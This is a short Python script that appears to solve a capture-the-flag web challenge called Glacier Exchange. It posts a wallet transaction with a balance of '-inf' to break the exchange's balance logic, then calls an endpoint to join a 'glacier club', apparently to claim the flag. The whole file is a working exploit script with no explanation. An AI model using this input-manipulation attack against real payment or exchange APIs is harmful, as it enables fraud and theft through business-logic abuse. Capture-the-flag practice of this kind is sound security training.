import requests

session = requests.session()

burp0_url = "https://glacierexchange.web.glacierctf.com:443/api/wallet/transaction"
burp0_json={"balance": "-inf", "sourceCoin": "cashout", "targetCoin": "cashout"}
res = session.post(burp0_url, json=burp0_json)
print(res.text)

burp0_url = "https://glacierexchange.web.glacierctf.com:443/api/wallet/join_glacier_club"
res = session.post(burp0_url)
print(res.text)
